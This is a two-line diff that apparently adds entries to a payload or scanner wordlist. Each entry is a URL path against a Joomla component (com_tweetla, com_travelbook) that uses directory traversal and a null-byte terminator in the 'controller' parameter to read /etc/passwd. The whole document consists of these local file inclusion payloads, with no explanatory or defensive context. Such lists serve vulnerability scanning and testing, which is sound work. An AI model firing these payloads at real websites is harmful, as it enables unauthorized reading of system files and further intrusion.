@@ -1,0 +1,2 @@
+/index.php?option=com_tweetla&controller=../../../../../../../etc/passwd%00
+/index.php?option=com_travelbook&controller=../../../../../../../../../../etc/passwd%00
